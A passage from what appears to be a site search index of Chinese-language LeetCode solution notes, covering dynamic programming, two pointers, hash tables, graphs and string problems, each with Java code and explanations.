力扣\ns = \u0026#34;leetcode\u0026#34;, dict = [\u0026#34;leet\u0026#34;, \u0026#34;code\u0026#34;]. Return true because \u0026#34;leetcode\u0026#34; can be segmented as \u0026#34;leet code\u0026#34;. dict 中的单词没有使用次数的限制，因此这是一个完全背包问题。\n该问题涉及到字典中单词的使用顺序，也就是说物品必须按一定顺序放入背包中，例如下面的 dict 就不够组成字符串 \u0026ldquo;leetcode\u0026rdquo;：\n[\u0026#34;lee\u0026#34;, \u0026#34;tc\u0026#34;, \u0026#34;cod\u0026#34;] 求解顺序的完全背包问题时，对物品的迭代应该放在最里层，对背包的迭代放在外层，只有这样才能让物品按一定顺序放入背包中。\npublic boolean wordBreak(String s, List\u0026lt;String\u0026gt; wordDict) { int n = s.length(); boolean[] dp = new boolean[n + 1]; dp[0] = true; for (int i = 1; i \u0026lt;= n; i++) { for (String word : wordDict) { // 对物品的迭代应该放在最里层  int len = word.length(); if (len \u0026lt;= i \u0026amp;\u0026amp; word.equals(s.substring(i - len, i))) { dp[i] = dp[i] || dp[i - len]; } } } return dp[n]; } 7. 组合总和    377. Combination Sum IV (Medium)\nLeetcode / 力扣\nnums = [1, 2, 3] target = 4 The possible combination ways are: (1, 1, 1, 1) (1, 1, 2) (1, 2, 1) (1, 3) (2, 1, 1) (2, 2) (3, 1) Note that different sequences are counted as different combinations. Therefore the output is 7. 涉及顺序的完全背包。\npublic int combinationSum4(int[] nums, int target) { if (nums == null || nums.length == 0) { return 0; } int[] maximum = new int[target + 1]; maximum[0] = 1; Arrays.sort(nums); for (int i = 1; i \u0026lt;= target; i++) { for (int j = 0; j \u0026lt; nums.length \u0026amp;\u0026amp; nums[j] \u0026lt;= i; j++) { maximum[i] += maximum[i - nums[j]]; } } return maximum[target]; } 股票交易    1. 需要冷却期的股票交易    309. Best Time to Buy and Sell Stock with Cooldown(Medium)\nLeetcode / 力扣\n题目描述：交易之后需要有一天的冷却时间。\n\npublic int maxProfit(int[] prices) { if (prices == null || prices.length == 0) { return 0; } int N = prices.length; int[] buy = new int[N]; int[] s1 = new int[N]; int[] sell = new int[N]; int[] s2 = new int[N]; s1[0] = buy[0] = -prices[0]; sell[0] = s2[0] = 0; for (int i = 1; i \u0026lt; N; i++) { buy[i] = s2[i - 1] - prices[i]; s1[i] = Math.max(buy[i - 1], s1[i - 1]); sell[i] = Math.max(buy[i - 1], s1[i - 1]) + prices[i]; s2[i] = Math.max(s2[i - 1], sell[i - 1]); } return Math.max(sell[N - 1], s2[N - 1]); } 2. 需要交易费用的股票交易    714. Best Time to Buy and Sell Stock with Transaction Fee (Medium)\nLeetcode / 力扣\nInput: prices = [1, 3, 2, 8, 4, 9], fee = 2 Output: 8 Explanation: The maximum profit can be achieved by: Buying at prices[0] = 1 Selling at prices[3] = 8 Buying at prices[4] = 4 Selling at prices[5] = 9 The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8. 题目描述：每交易一次，都要支付一定的费用。\n\npublic int maxProfit(int[] prices, int fee) { int N = prices.length; int[] buy = new int[N]; int[] s1 = new int[N]; int[] sell = new int[N]; int[] s2 = new int[N]; s1[0] = buy[0] = -prices[0]; sell[0] = s2[0] = 0; for (int i = 1; i \u0026lt; N; i++) { buy[i] = Math.max(sell[i - 1], s2[i - 1]) - prices[i]; s1[i] = Math.max(buy[i - 1], s1[i - 1]); sell[i] = Math.max(buy[i - 1], s1[i - 1]) - fee + prices[i]; s2[i] = Math.max(s2[i - 1], sell[i - 1]); } return Math.max(sell[N - 1], s2[N - 1]); } 3. 只能进行两次的股票交易    123. Best Time to Buy and Sell Stock III (Hard)\nLeetcode / 力扣\npublic int maxProfit(int[] prices) { int firstBuy = Integer.MIN_VALUE, firstSell = 0; int secondBuy = Integer.MIN_VALUE, secondSell = 0; for (int curPrice : prices) { if (firstBuy \u0026lt; -curPrice) { firstBuy = -curPrice; } if (firstSell \u0026lt; firstBuy + curPrice) { firstSell = firstBuy + curPrice; } if (secondBuy \u0026lt; firstSell - curPrice) { secondBuy = firstSell - curPrice; } if (secondSell \u0026lt; secondBuy + curPrice) { secondSell = secondBuy + curPrice; } } return secondSell; } 4. 只能进行 k 次的股票交易    188. Best Time to Buy and Sell Stock IV (Hard)\nLeetcode / 力扣\npublic int maxProfit(int k, int[] prices) { int n = prices.length; if (k \u0026gt;= n / 2) { // 这种情况下该问题退化为普通的股票交易问题  int maxProfit = 0; for (int i = 1; i \u0026lt; n; i++) { if (prices[i] \u0026gt; prices[i - 1]) { maxProfit += prices[i] - prices[i - 1]; } } return maxProfit; } int[][] maxProfit = new int[k + 1][n]; for (int i = 1; i \u0026lt;= k; i++) { int localMax = maxProfit[i - 1][0] - prices[0]; for (int j = 1; j \u0026lt; n; j++) { maxProfit[i][j] = Math.max(maxProfit[i][j - 1], prices[j] + localMax); localMax = Math.max(localMax, maxProfit[i - 1][j] - prices[j]); } } return maxProfit[k][n - 1]; } 字符串编辑    1. 删除两个字符串的字符使它们相等    583. Delete Operation for Two Strings (Medium)\nLeetcode / 力扣\nInput: \u0026#34;sea\u0026#34;, \u0026#34;eat\u0026#34; Output: 2 Explanation: You need one step to make \u0026#34;sea\u0026#34; to \u0026#34;ea\u0026#34; and another step to make \u0026#34;eat\u0026#34; to \u0026#34;ea\u0026#34;. 可以转换为求两个字符串的最长公共子序列问题。\npublic int minDistance(String word1, String word2) { int m = word1.length(), n = word2.length(); int[][] dp = new int[m + 1][n + 1]; for (int i = 1; i \u0026lt;= m; i++) { for (int j = 1; j \u0026lt;= n; j++) { if (word1.charAt(i - 1) == word2.charAt(j - 1)) { dp[i][j] = dp[i - 1][j - 1] + 1; } else { dp[i][j] = Math.max(dp[i][j - 1], dp[i - 1][j]); } } } return m + n - 2 * dp[m][n]; } 2. 编辑距离    72. Edit Distance (Hard)\nLeetcode / 力扣\nExample 1: Input: word1 = \u0026#34;horse\u0026#34;, word2 = \u0026#34;ros\u0026#34; Output: 3 Explanation: horse -\u0026gt; rorse (replace \u0026#39;h\u0026#39; with \u0026#39;r\u0026#39;) rorse -\u0026gt; rose (remove \u0026#39;r\u0026#39;) rose -\u0026gt; ros (remove \u0026#39;e\u0026#39;) Example 2: Input: word1 = \u0026#34;intention\u0026#34;, word2 = \u0026#34;execution\u0026#34; Output: 5 Explanation: intention -\u0026gt; inention (remove \u0026#39;t\u0026#39;) inention -\u0026gt; enention (replace \u0026#39;i\u0026#39; with \u0026#39;e\u0026#39;) enention -\u0026gt; exention (replace \u0026#39;n\u0026#39; with \u0026#39;x\u0026#39;) exention -\u0026gt; exection (replace \u0026#39;n\u0026#39; with \u0026#39;c\u0026#39;) exection -\u0026gt; execution (insert \u0026#39;u\u0026#39;) 题目描述：修改一个字符串成为另一个字符串，使得修改次数最少。一次修改操作包括：插入一个字符、删除一个字符、替换一个字符。\npublic int minDistance(String word1, String word2) { if (word1 == null || word2 == null) { return 0; } int m = word1.length(), n = word2.length(); int[][] dp = new int[m + 1][n + 1]; for (int i = 1; i \u0026lt;= m; i++) { dp[i][0] = i; } for (int i = 1; i \u0026lt;= n; i++) { dp[0][i] = i; } for (int i = 1; i \u0026lt;= m; i++) { for (int j = 1; j \u0026lt;= n; j++) { if (word1.charAt(i - 1) == word2.charAt(j - 1)) { dp[i][j] = dp[i - 1][j - 1]; } else { dp[i][j] = Math.min(dp[i - 1][j - 1], Math.min(dp[i][j - 1], dp[i - 1][j])) + 1; } } } return dp[m][n]; } 3. 复制粘贴字符    650. 2 Keys Keyboard (Medium)\nLeetcode / 力扣\n题目描述：最开始只有一个字符 A，问需要多少次操作能够得到 n 个字符 A，每次操作可以复制当前所有的字符，或者粘贴。\nInput: 3 Output: 3 Explanation: Intitally, we have one character 'A'. In step 1, we use Copy All operation. In step 2, we use Paste operation to get 'AA'. In step 3, we use Paste operation to get 'AAA'. public int minSteps(int n) { if (n == 1) return 0; for (int i = 2; i \u0026lt;= Math.sqrt(n); i++) { if (n % i == 0) return i + minSteps(n / i); } return n; } public int minSteps(int n) { int[] dp = new int[n + 1]; int h = (int) Math.sqrt(n); for (int i = 2; i \u0026lt;= n; i++) { dp[i] = i; for (int j = 2; j \u0026lt;= h; j++) { if (i % j == 0) { dp[i] = dp[j] + dp[i / j]; break; } } } return dp[n]; } "},{"id":244,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E5%8F%8C%E6%8C%87%E9%92%88/","title":"Leetcode 题解 - 双指针","parent":"笔记","content":"Leetcode 题解 - 双指针     Leetcode 题解 - 双指针  1. 有序数组的 Two Sum 2. 两数平方和 3. 反转字符串中的元音字符 4. 回文字符串 5. 归并两个有序数组 6. 判断链表是否存在环 7. 最长子序列    双指针主要用于遍历数组，两个指针指向不同的元素，从而协同完成任务。\n1. 有序数组的 Two Sum    167. Two Sum II - Input array is sorted (Easy)\nLeetcode / 力扣\nInput: numbers={2, 7, 11, 15}, target=9 Output: index1=1, index2=2 题目描述：在有序数组中找出两个数，使它们的和为 target。\n使用双指针，一个指针指向值较小的元素，一个指针指向值较大的元素。指向较小元素的指针从头向尾遍历，指向较大元素的指针从尾向头遍历。\n 如果两个指针指向元素的和 sum == target，那么得到要求的结果； 如果 sum \u0026gt; target，移动较大的元素，使 sum 变小一些； 如果 sum \u0026lt; target，移动较小的元素，使 sum 变大一些。  数组中的元素最多遍历一次，时间复杂度为 O(N)。只使用了两个额外变量，空间复杂度为 O(1)。\n\npublic int[] twoSum(int[] numbers, int target) { if (numbers == null) return null; int i = 0, j = numbers.length - 1; while (i \u0026lt; j) { int sum = numbers[i] + numbers[j]; if (sum == target) { return new int[]{i + 1, j + 1}; } else if (sum \u0026lt; target) { i++; } else { j--; } } return null; } 2. 两数平方和    633. Sum of Square Numbers (Easy)\nLeetcode / 力扣\nInput: 5 Output: True Explanation: 1 * 1 + 2 * 2 = 5 题目描述：判断一个非负整数是否为两个整数的平方和。\n可以看成是在元素为 0~target 的有序数组中查找两个数，使得这两个数的平方和为 target，如果能找到，则返回 true，表示 target 是两个整数的平方和。\n本题和 167. Two Sum II - Input array is sorted 类似，只有一个明显区别：一个是和为 target，一个是平方和为 target。本题同样可以使用双指针得到两个数，使其平方和为 target。\n本题的关键是右指针的初始化，实现剪枝，从而降低时间复杂度。设右指针为 x，左指针固定为 0，为了使 02 + x2 的值尽可能接近 target，我们可以将 x 取为 sqrt(target)。\n因为最多只需要遍历一次 0~sqrt(target)，所以时间复杂度为 O(sqrt(target))。又因为只使用了两个额外的变量，因此空间复杂度为 O(1)。\npublic boolean judgeSquareSum(int target) { if (target \u0026lt; 0) return false; int i = 0, j = (int) Math.sqrt(target); while (i \u0026lt;= j) { int powSum = i * i + j * j; if (powSum == target) { return true; } else if (powSum \u0026gt; target) { j--; } else { i++; } } return false; } 3. 反转字符串中的元音字符    345. Reverse Vowels of a String (Easy)\nLeetcode / 力扣\nGiven s = \u0026#34;leetcode\u0026#34;, return \u0026#34;leotcede\u0026#34;. \n使用双指针，一个指针从头向尾遍历，一个指针从尾到头遍历，当两个指针都遍历到元音字符时，交换这两个元音字符。\n为了快速判断一个字符是不是元音字符，我们将全部元音字符添加到集合 HashSet 中，从而以 O(1) 的时间复杂度进行该操作。\n 时间复杂度为 O(N)：只需要遍历所有元素一次 空间复杂度 O(1)：只需要使用两个额外变量  \nprivate final static HashSet\u0026lt;Character\u0026gt; vowels = new HashSet\u0026lt;\u0026gt;( Arrays.asList(\u0026#39;a\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;u\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;E\u0026#39;, \u0026#39;I\u0026#39;, \u0026#39;O\u0026#39;, \u0026#39;U\u0026#39;)); public String reverseVowels(String s) { if (s == null) return null; int i = 0, j = s.length() - 1; char[] result = new char[s.length()]; while (i \u0026lt;= j) { char ci = s.charAt(i); char cj = s.charAt(j); if (!vowels.contains(ci)) { result[i++] = ci; } else if (!vowels.contains(cj)) { result[j--] = cj; } else { result[i++] = cj; result[j--] = ci; } } return new String(result); } 4. 回文字符串    680. Valid Palindrome II (Easy)\nLeetcode / 力扣\nInput: \u0026#34;abca\u0026#34; Output: True Explanation: You could delete the character \u0026#39;c\u0026#39;. 题目描述：可以删除一个字符，判断是否能构成回文字符串。\n所谓的回文字符串，是指具有左右对称特点的字符串，例如 \u0026ldquo;abcba\u0026rdquo; 就是一个回文字符串。\n使用双指针可以很容易判断一个字符串是否是回文字符串：令一个指针从左到右遍历，一个指针从右到左遍历，这两个指针同时移动一个位置，每次都判断两个指针指向的字符是否相同，如果都相同，字符串才是具有左右对称性质的回文字符串。\n\n本题的关键是处理删除一个字符。在使用双指针遍历字符串时，如果出现两个指针指向的字符不相等的情况，我们就试着删除一个字符，再判断删除完之后的字符串是否是回文字符串。\n在判断是否为回文字符串时，我们不需要判断整个字符串，因为左指针左边和右指针右边的字符之前已经判断过具有对称性质，所以只需要判断中间的子字符串即可。\n在试着删除字符时，我们既可以删除左指针指向的字符，也可以删除右指针指向的字符。\n\npublic boolean validPalindrome(String s) { for (int i = 0, j = s.length() - 1; i \u0026lt; j; i++, j--) { if (s.charAt(i) != s.charAt(j)) { return isPalindrome(s, i, j - 1) || isPalindrome(s, i + 1, j); } } return true; } private boolean isPalindrome(String s, int i, int j) { while (i \u0026lt; j) { if (s.charAt(i++) != s.charAt(j--)) { return false; } } return true; } 5. 归并两个有序数组    88. Merge Sorted Array (Easy)\nLeetcode / 力扣\nInput: nums1 = [1,2,3,0,0,0], m = 3 nums2 = [2,5,6], n = 3 Output: [1,2,2,3,5,6] 题目描述：把归并结果存到第一个数组上。\n需要从尾开始遍历，否则在 nums1 上归并得到的值会覆盖还未进行归并比较的值。\npublic void merge(int[] nums1, int m, int[] nums2, int n) { int index1 = m - 1, index2 = n - 1; int indexMerge = m + n - 1; while (index2 \u0026gt;= 0) { if (index1 \u0026lt; 0) { nums1[indexMerge--] = nums2[index2--]; } else if (index2 \u0026lt; 0) { nums1[indexMerge--] = nums1[index1--]; } else if (nums1[index1] \u0026gt; nums2[index2]) { nums1[indexMerge--] = nums1[index1--]; } else { nums1[indexMerge--] = nums2[index2--]; } } } 6. 判断链表是否存在环    141. Linked List Cycle (Easy)\nLeetcode / 力扣\n使用双指针，一个指针每次移动一个节点，一个指针每次移动两个节点，如果存在环，那么这两个指针一定会相遇。\npublic boolean hasCycle(ListNode head) { if (head == null) { return false; } ListNode l1 = head, l2 = head.next; while (l1 != null \u0026amp;\u0026amp; l2 != null \u0026amp;\u0026amp; l2.next != null) { if (l1 == l2) { return true; } l1 = l1.next; l2 = l2.next.next; } return false; } 7. 最长子序列    524. Longest Word in Dictionary through Deleting (Medium)\nLeetcode / 力扣\nInput: s = \u0026quot;abpcplea\u0026quot;, d = [\u0026quot;ale\u0026quot;,\u0026quot;apple\u0026quot;,\u0026quot;monkey\u0026quot;,\u0026quot;plea\u0026quot;] Output: \u0026quot;apple\u0026quot; 题目描述：删除 s 中的一些字符，使得它构成字符串列表 d 中的一个字符串，找出能构成的最长字符串。如果有多个相同长度的结果，返回字典序的最小字符串。\n通过删除字符串 s 中的一个字符能得到字符串 t，可以认为 t 是 s 的子序列，我们可以使用双指针来判断一个字符串是否为另一个字符串的子序列。\npublic String findLongestWord(String s, List\u0026lt;String\u0026gt; d) { String longestWord = \u0026#34;\u0026#34;; for (String target : d) { int l1 = longestWord.length(), l2 = target.length(); if (l1 \u0026gt; l2 || (l1 == l2 \u0026amp;\u0026amp; longestWord.compareTo(target) \u0026lt; 0)) { continue; } if (isSubstr(s, target)) { longestWord = target; } } return longestWord; } private boolean isSubstr(String s, String target) { int i = 0, j = 0; while (i \u0026lt; s.length() \u0026amp;\u0026amp; j \u0026lt; target.length()) { if (s.charAt(i) == target.charAt(j)) { j++; } i++; } return j == target.length(); } "},{"id":245,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E5%93%88%E5%B8%8C%E8%A1%A8/","title":"Leetcode 题解 - 哈希表","parent":"笔记","content":"Leetcode 题解 - 哈希表     Leetcode 题解 - 哈希表  1. 数组中两个数的和为给定值 2. 判断数组是否含有重复元素 3. 最长和谐序列 4. 最长连续序列    哈希表使用 O(N) 空间复杂度存储数据，并且以 O(1) 时间复杂度求解问题。\n Java 中的 HashSet 用于存储一个集合，可以查找元素是否在集合中。如果元素有穷，并且范围不大，那么可以用一个布尔数组来存储一个元素是否存在。例如对于只有小写字符的元素，就可以用一个长度为 26 的布尔数组来存储一个字符集合，使得空间复杂度降低为 O(1)。  Java 中的 HashMap 主要用于映射关系，从而把两个元素联系起来。HashMap 也可以用来对元素进行计数统计，此时键为元素，值为计数。和 HashSet 类似，如果元素有穷并且范围不大，可以用整型数组来进行统计。在对一个内容进行压缩或者其它转换时，利用 HashMap 可以把原始内容和转换后的内容联系起来。例如在一个简化 url 的系统中 [Leetcdoe : 535. Encode and Decode TinyURL (Medium)\nLeetcode，利用 HashMap 就可以存储精简后的 url 到原始 url 的映射，使得不仅可以显示简化的 url，也可以根据简化的 url 得到原始 url 从而定位到正确的资源�) / 力扣，利用 HashMap 就可以存储精简后的 url 到原始 url 的映射，使得不仅可以显示简化的 url，也可以根据简化的 url 得到原始 url 从而定位到正确的资源�)\n1. 数组中两个数的和为给定值    1. Two Sum (Easy)\nLeetcode / 力扣\n可以先对数组进行排序，然后使用双指针方法或者二分查找方法。这样做的时间复杂度为 O(NlogN)，空间复杂度为 O(1)。\n用 HashMap 存储数组元素和索引的映射，在访问到 nums[i] 时，判断 HashMap 中是否存在 target - nums[i]，如果存在说明 target - nums[i] 所在的索引和 i 就是要找的两个数。该方法的时间复杂度为 O(N)，空间复杂度为 O(N)，使用空间来换取时间。\npublic int[] twoSum(int[] nums, int target) { HashMap\u0026lt;Integer, Integer\u0026gt; indexForNum = new HashMap\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; nums.length; i++) { if (indexForNum.containsKey(target - nums[i])) { return new int[]{indexForNum.get(target - nums[i]), i}; } else { indexForNum.put(nums[i], i); } } return null; } 2. 判断数组是否含有重复元素    217. Contains Duplicate (Easy)\nLeetcode / 力扣\npublic boolean containsDuplicate(int[] nums) { Set\u0026lt;Integer\u0026gt; set = new HashSet\u0026lt;\u0026gt;(); for (int num : nums) { set.add(num); } return set.size() \u0026lt; nums.length; } 3. 最长和谐序列    594. Longest Harmonious Subsequence (Easy)\nLeetcode / 力扣\nInput: [1,3,2,2,5,2,3,7] Output: 5 Explanation: The longest harmonious subsequence is [3,2,2,2,3]. 和谐序列中最大数和最小数之差正好为 1，应该注意的是序列的元素不一定是数组的连续元素。\npublic int findLHS(int[] nums) { Map\u0026lt;Integer, Integer\u0026gt; countForNum = new HashMap\u0026lt;\u0026gt;(); for (int num : nums) { countForNum.put(num, countForNum.getOrDefault(num, 0) + 1); } int longest = 0; for (int num : countForNum.keySet()) { if (countForNum.containsKey(num + 1)) { longest = Math.max(longest, countForNum.get(num + 1) + countForNum.get(num)); } } return longest; } 4. 最长连续序列    128. Longest Consecutive Sequence (Hard)\nLeetcode / 力扣\nGiven [100, 4, 200, 1, 3, 2], The longest consecutive elements sequence is [1, 2, 3, 4]. Return its length: 4. 要求以 O(N) 的时间复杂度求解。\npublic int longestConsecutive(int[] nums) { Map\u0026lt;Integer, Integer\u0026gt; countForNum = new HashMap\u0026lt;\u0026gt;(); for (int num : nums) { countForNum.put(num, 1); } for (int num : nums) { forward(countForNum, num); } return maxCount(countForNum); } private int forward(Map\u0026lt;Integer, Integer\u0026gt; countForNum, int num) { if (!countForNum.containsKey(num)) { return 0; } int cnt = countForNum.get(num); if (cnt \u0026gt; 1) { return cnt; } cnt = forward(countForNum, num + 1) + 1; countForNum.put(num, cnt); return cnt; } private int maxCount(Map\u0026lt;Integer, Integer\u0026gt; countForNum) { int max = 0; for (int num : countForNum.keySet()) { max = Math.max(max, countForNum.get(num)); } return max; } "},{"id":246,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E5%9B%BE/","title":"Leetcode 题解 - 图","parent":"笔记","content":"Leetcode 题解 - 图     Leetcode 题解 - 图  二分图  1. 判断是否为二分图   拓扑排序  1. 课程安排的合法性 2. 课程安排的顺序   并查集  1. 冗余连接      二分图    如果可以用两种颜色对图中的节点进行着色，并且保证相邻的节点颜色不同，那么这个图就是二分图。\n1. 判断是否为二分图    785. Is Graph Bipartite? (Medium)\nLeetcode / 力扣\nInput: [[1,3], [0,2], [1,3], [0,2]] Output: true Explanation: The graph looks like this: 0----1 | | | | 3----2 We can divide the vertices into two groups: {0, 2} and {1, 3}. Example 2: Input: [[1,2,3], [0,2], [0,1,3], [0,2]] Output: false Explanation: The graph looks like this: 0----1 | \\ | | \\ | 3----2 We cannot find a way to divide the set of nodes into two independent subsets. public boolean isBipartite(int[][] graph) { int[] colors = new int[graph.length]; Arrays.fill(colors, -1); for (int i = 0; i \u0026lt; graph.length; i++) { // 处理图不是连通的情况  if (colors[i] == -1 \u0026amp;\u0026amp; !isBipartite(i, 0, colors, graph)) { return false; } } return true; } private boolean isBipartite(int curNode, int curColor, int[] colors, int[][] graph) { if (colors[curNode] != -1) { return colors[curNode] == curColor; } colors[curNode] = curColor; for (int nextNode : graph[curNode]) { if (!isBipartite(nextNode, 1 - curColor, colors, graph)) { return false; } } return true; } 拓扑排序    常用于在具有先序关系的任务规划中。\n1. 课程安排的合法性    207. Course Schedule (Medium)\nLeetcode / 力扣\n2, [[1,0]] return true 2, [[1,0],[0,1]] return false 题目描述：一个课程可能会先修课程，判断给定的先修课程规定是否合法。\n本题不需要使用拓扑排序，只需要检测有向图是否存在环即可。\npublic boolean canFinish(int numCourses, int[][] prerequisites) { List\u0026lt;Integer\u0026gt;[] graphic = new List[numCourses]; for (int i = 0; i \u0026lt; numCourses; i++) { graphic[i] = new ArrayList\u0026lt;\u0026gt;(); } for (int[] pre : prerequisites) { graphic[pre[0]].add(pre[1]); } boolean[] globalMarked = new boolean[numCourses]; boolean[] localMarked = new boolean[numCourses]; for (int i = 0; i \u0026lt; numCourses; i++) { if (hasCycle(globalMarked, localMarked, graphic, i)) { return false; } } return true; } private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List\u0026lt;Integer\u0026gt;[] graphic, int curNode) { if (localMarked[curNode]) { return true; } if (globalMarked[curNode]) { return false; } globalMarked[curNode] = true; localMarked[curNode] = true; for (int nextNode : graphic[curNode]) { if (hasCycle(globalMarked, localMarked, graphic, nextNode)) { return true; } } localMarked[curNode] = false; return false; } 2. 课程安排的顺序    210. Course Schedule II (Medium)\nLeetcode / 力扣\n4, [[1,0],[2,0],[3,1],[3,2]] There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3]. 使用 DFS 来实现拓扑排序，使用一个栈存储后序遍历结果，这个栈的逆序结果就是拓扑排序结果。\n证明：对于任何先序关系：v-\u0026gt;w，后序遍历结果可以保证 w 先进入栈中，因此栈的逆序结果中 v 会在 w 之前。\npublic int[] findOrder(int numCourses, int[][] prerequisites) { List\u0026lt;Integer\u0026gt;[] graphic = new List[numCourses]; for (int i = 0; i \u0026lt; numCourses; i++) { graphic[i] = new ArrayList\u0026lt;\u0026gt;(); } for (int[] pre : prerequisites) { graphic[pre[0]].add(pre[1]); } Stack\u0026lt;Integer\u0026gt; postOrder = new Stack\u0026lt;\u0026gt;(); boolean[] globalMarked = new boolean[numCourses]; boolean[] localMarked = new boolean[numCourses]; for (int i = 0; i \u0026lt; numCourses; i++) { if (hasCycle(globalMarked, localMarked, graphic, i, postOrder)) { return new int[0]; } } int[] orders = new int[numCourses]; for (int i = numCourses - 1; i \u0026gt;= 0; i--) { orders[i] = postOrder.pop(); } return orders; } private boolean hasCycle(boolean[] globalMarked, boolean[] localMarked, List\u0026lt;Integer\u0026gt;[] graphic, int curNode, Stack\u0026lt;Integer\u0026gt; postOrder) { if (localMarked[curNode]) { return true; } if (globalMarked[curNode]) { return false; } globalMarked[curNode] = true; localMarked[curNode] = true; for (int nextNode : graphic[curNode]) { if (hasCycle(globalMarked, localMarked, graphic, nextNode, postOrder)) { return true; } } localMarked[curNode] = false; postOrder.push(curNode); return false; } 并查集    并查集可以动态地连通两个点，并且可以非常快速地判断两个点是否连通。\n1. 冗余连接    684. Redundant Connection (Medium)\nLeetcode / 力扣\nInput: [[1,2], [1,3], [2,3]] Output: [2,3] Explanation: The given undirected graph will be like this: 1 / \\ 2 - 3 题目描述：有一系列的边连成的图，找出一条边，移除它之后该图能够成为一棵树。\npublic int[] findRedundantConnection(int[][] edges) { int N = edges.length; UF uf = new UF(N); for (int[] e : edges) { int u = e[0], v = e[1]; if (uf.connect(u, v)) { return e; } uf.union(u, v); } return new int[]{-1, -1}; } private class UF { private int[] id; UF(int N) { id = new int[N + 1]; for (int i = 0; i \u0026lt; id.length; i++) { id[i] = i; } } void union(int u, int v) { int uID = find(u); int vID = find(v); if (uID == vID) { return; } for (int i = 0; i \u0026lt; id.length; i++) { if (id[i] == uID) { id[i] = vID; } } } int find(int p) { return id[p]; } boolean connect(int u, int v) { return find(u) == find(v); } } "},{"id":247,"href":"/%E7%AC%94%E8%AE%B0/Leetcode-/LeetcodeLeetcode-%E9%A2%98%E8%A7%A3-%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"Leetcode 题解 - 字符串","parent":"笔记","content":"Leetcode 题解 - 字符串     Leetcode 题解 - 字符串  1. 字符串循环移位包含 2. 字符串循环移位 3. 字符串中单词的翻转 4. 两个字符串包含的字符是否完全相同 5. 计算一组字符集合可以组成的回文字符串的最大长度 6. 字符串同构 7. 回文子字符串个数 8. 判断一个整数是否是回文数 9. 统计二进制字符串中连续 1 和连续 0 数量相同的子字符串个数    1. 字符串循环移位包含    编程之美 3.1\ns1 = AABCD, s2 = CDAA Return : true 给定两个字符串 s1 和 s2，要求判定 s2 是否能够被 s1 做循环移位得到的字符串包含。\ns1 进行循环移位的结果是 s1s1 的子字符串，因此只要判断 s2 是否是 s1s1 的子字符串即可。\n2. 字符串循环移位    编程之美 2.17\ns = \u0026#34;abcd123\u0026#34; k = 3 Return \u0026#34;123abcd\u0026#34; 将字符串向右循环移动 k 位。\n将 abcd123 中的 abcd 和 123 单独翻转，得到 dcba321，然后对整个字符串进行翻转，得到 123abcd。\n3. 字符串中单词的翻转    程序员代码面试指南\ns = \u0026#34;I am a student\u0026#34; Return \u0026#34;student a am I\u0026#34; 将每个单词翻转，然后将整个字符串翻转。\n4. 两个字符串包含的字符是否完全相同    242. Valid Anagram (Easy)\nLeetcode / 力扣\ns = \u0026#34;anagram\u0026#34;, t = \u0026#34;nagaram\u0026#34;, return true. s = \u0026#34;rat\u0026#34;, t = \u0026#34;car\u0026#34;, return false. 可以用 HashMap 来映射字符与出现次数，然后比较两个字符串出现的字符数量是否相同。\n由于本题的字符串只包含 26 个小写字符，因此可以使用长度为 26 的整型数组对字符串出现的字符进行统计，不再使用 HashMap。\npublic boolean isAnagram(String s, String t) { int[] cnts = new int[26]; for (char c : s.toCharArray()) { cnts[c - \u0026#39;a\u0026#39;]++; } for (char c : t.toCharArray()) { cnts[c - \u0026#39;a\u0026#39;]--; } for (int cnt : cnts) { if (cnt != 0) { return false; } } return true; } 5. 计算一组字符集合可以组成的回文字符串的最大长度    409. Longest Palindrome (Easy)\nLeetcode / 力扣\nInput : \u0026#34;abccccdd\u0026#34; Output : 7 Explanation : One longest palindrome that can be built is \u0026#34;dccaccd\u0026#34;, whose length is 7. 使用长度为 256 的整型数组来统计每个字符出现的个数，每个字符有偶数个可以用来构成回文字符串。\n因为回文字符串最中间的那个字符可以单独出现，所以如果有单独的字符就把它放到最中间。\npublic int longestPalindrome(String s) { int[] cnts = new int[256]; for (char c : s.toCharArray()) { cnts[c]++; } int palindrome = 0; for (int cnt : cnts) { palindrome += (cnt / 2) * 2; } if (palindrome \u0026lt; s.length()) { palindrome++; // 这个条件下 s 中一定有单个未使用的字符存在，可以把这个字符放到回文的最中间  } return palindrome; } 6. 字符串同构    205. Isomorphic Strings (Easy)\nLeetcode / 力扣\nGiven \u0026#34;egg\u0026#34;, \u0026#34;add\u0026#34;, return true. Given \u0026#34;foo\u0026#34;, \u0026#34;bar\u0026#34;, return false. Given \u0026#34;paper\u0026#34;, \u0026#34;title\u0026#34;, return true. 记录一个字符上次出现的位置，如果两个字符串中的字符上次出现的位置一样，那么就属于同构。\npublic boolean isIsomorphic(String s, String t) { int[] preIndexOfS = new int[256]; int[] preIndexOfT = new int[256]; for (int i = 0; i \u0026lt; s.length(); i++) { char sc = s.charAt(i), tc = t.charAt(i); if (preIndexOfS[sc] != preIndexOfT[tc]) { return false; } preIndexOfS[sc] = i + 1; preIndexOfT[tc] = i + 1; } return true; } 7. 回文子字符串个数    647. Palindromic Substrings (Medium)\nLeetcode / 力扣\nInput: \u0026#34;aaa\u0026#34; Output: 6 Explanation: Six palindromic strings: \u0026#34;a\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;a\u0026#34;, \u0026#34;aa\u0026#34;, \u0026#34;aa\u0026#34;, \u0026#34;aaa\u0026#34;. 从字符串的某一位开始，尝试着去扩展子字符串。\nprivate int cnt = 0; public int countSubstrings(String s) { for (int i = 0; i \u0026lt; s.length(); i++) { extendSubstrings(s, i, i); // 奇数长度  extendSubstrings(s, i, i + 1); // 偶数长度  } return cnt; } private void extendSubstrings(String s, int start, int end) { while (start \u0026gt;= 0 \u0026amp;\u0026amp; end \u0026lt; s.length() 